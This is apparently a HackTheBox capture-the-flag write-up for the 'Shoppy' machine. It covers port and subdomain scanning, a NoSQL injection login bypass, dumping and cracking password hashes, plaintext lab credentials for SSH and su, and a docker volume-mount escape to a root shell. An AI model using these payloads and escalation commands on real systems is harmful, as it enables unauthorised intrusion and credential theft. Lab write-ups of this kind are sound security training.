---
layout: post
title: Shoppy
tags: htb wup linux rce ffuf mattermost Nosqli ssh docker 
categories: HackTheBox 
---

# Description

|||
| -- | -- |
| S.O | Linux |
| Difficulty | Easy |


## Recon

## Nmap scan

In this case, we use nmap for scan the ports and services.

~~~ bash
nmap -sC -sV 10.10.11.180 -p- -vvv -Pn -n --open
~~~

![alt text](/assets/img/Pasted%20image%2020240320135303.png)

We found 3 open ports. 22, 80 and 9093.

## Directory enumeration with ffuf

~~~ bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -c -v --fc 301 
~~~

![alt text](/assets/img/Pasted%20image%2020240320140304.png)

We have found the following subdomain:

~~~ text
mattermost.shoppy.htb
~~~

![alt text](/assets/img/image.png)

## Directory enumeration with feroxbuster

~~~ bash
feroxbuster --url http://shoppy.htb/
~~~

![alt text](/assets/img/Pasted%20image%2020240320154324.png)

we have found the /Login directory

![alt text](/assets/img/image1.png)

## Port 9093

~~~ url
http://shoppy.htb:9093/
~~~

The port 9093 on the web browser returns some kind of log:

![alt text](/assets/img/Pasted%20image%2020240320160439.png)

## NoSQLi

We use this payload for NoSQLi 

~~~ payload
test' || '1'=='1
~~~

![alt text](/assets/img/Pasted%20image%2020240320220327.png)

With this we have access to the administration panel


![alt text](/assets/img/Pasted%20image%2020240320220351.png)

## User enumeration

We proceed to list users using the search engine, when we enter an existing user, we obtain a result similar to the following:

![alt text](/assets/img/Pasted%20image%2020240320220508.png)

When the user does not exist, we get the following response from the site:

![alt text](/assets/img/Pasted%20image%2020240320220542.png)

We intercept the user search request with our burpsuite and send it to the intruder.

![alt text](/assets/img/Pasted%20image%2020240320220837.png)

We get two valid users (admin/josh)

~~~ users
admin
josh
~~~

![alt text](/assets/img/Pasted%20image%2020240320221105.png)

We look for the user admin and click on the download button, we obtain the following:

![alt text](/assets/img/Pasted%20image%2020240320221225.png)

We look for the user josh and click on the download button, we obtain the report corresponding to the user josh.

![alt text](/assets/img/Pasted%20image%2020240320221307.png)

We will use the same SQL payload to see if we can get all the results at once


~~~ sql
test ' || '1'=='1
~~~

![alt text](/assets/img/Pasted%20image%2020240320221417.png)

Now when we make the report from the download button we obtain the two users instantly with their corresponding information.

![alt text](/assets/img/Pasted%20image%2020240320221515.png)

~~~ data
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
~~~

## Cracking Passwords

Crack user josh's password using crackstation

~~~ password
remembermethisway
~~~

![alt text](/assets/img/Pasted%20image%2020240321100206.png)

We tried to crack the password of the admin user, but it is not possible with crackstation or john the ripper

![alt text](/assets/img/Pasted%20image%2020240321222908.png)


## Using josh's credentials

We will try to log in with josh's credentials on the portal http://mattermost.shoppy.htb/login.

~~~ creds
josh:remembermethisway
~~~

![alt text](/assets/img/Pasted%20image%2020240321223053.png)

![alt text](/assets/img/Pasted%20image%2020240321223138.png)

Navigating the web application, we find credentials for the deploy machine.

![alt text](/assets/img/Pasted%20image%2020240321223244.png)


~~~ creds
jaeger:Sh0ppyBest@pp!
~~~

Since port 22 is open, we check if we can connect via ssh using these credentials.

## SSH

~~~ bash
ssh jaeger@shoppy.htb -p 22             #password -> Sh0ppyBest@pp!
~~~

We proceed to read the unprivileged user flag.

![alt text](/assets/img/Pasted%20image%2020240322134016.png)

## Analyzing the binary


We are looking for a binary that can be run without being root

~~~ bash
sudo -l
~~~

![alt text](/assets/img/Pasted%20image%2020240322142032.png)

~~~ path
/home/deploy/password-manager
~~~

The binary belongs to deploy, we will try to run it as "deploy"

~~~ bash
sudo -u deploy /home/deploy/password-manager
~~~

![alt text](/assets/img/Pasted%20image%2020240322142726.png)

We do not have the password, we will apply reversing to try to see the validation.

## Download binary to our kali linux machine

We set up an http server with python from the victim machine

~~~ bash
python3 -m http.server
~~~

![alt text](/assets/img/Pasted%20image%2020240322143156.png)

We download it from the web or by performing a wget to the binary.

![alt text](/assets/img/Pasted%20image%2020240322143254.png)


## Reversing with ghidra

First we will see what type of file it is

~~~ bash
file password-manager
~~~

![alt text](/assets/img/Pasted%20image%2020240322144223.png)

![alt text](/assets/img/Pasted%20image%2020240322145107.png)

As seen in the binary, the string Sample is concatenated and this is passed to the variable pbVar2 as a password and at the end if the password is correct it executes a cat to the file creds.txt

Now we will try to run the binary again as the "deploy" user but this time providing the Sample password.

We execute the following command and give the corresponding password to jaeger:

~~~ bash
sudo -u deploy /home/deploy/password-manager  
# password -> Sh0ppyBest@pp!
~~~

We enter the password "Sample"

![alt text](/assets/img/Pasted%20image%2020240322145712.png)

Now we have the deploy credentials.

We change accounts using your.

~~~ bash
su deploy #password -> Deploying@pp!
~~~

We get a bash

~~~ bash
bash
~~~

![alt text](/assets/img/Pasted%20image%2020240322145901.png)


## Privilege Escalation

We verify the groups to which the user deploy "id" belongs

~~~ bash
id
~~~

![alt text](/assets/img/Pasted%20image%2020240322152549.png)

We can see that it has docker and the user has sufficient permissions to run it, we verify the images that are in docker.

~~~ bash
docker images
~~~

![alt text](/assets/img/Pasted%20image%2020240322152634.png)

We use it to escape the restricted environment by having it run a shell as root.

~~~ bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
~~~

![alt text](/assets/img/Pasted%20image%2020240322153809.png)

Now we just have to read the flag of the root user

~~~ bash
cat /root/root.txt
~~~

![alt text](/assets/img/11111.png)
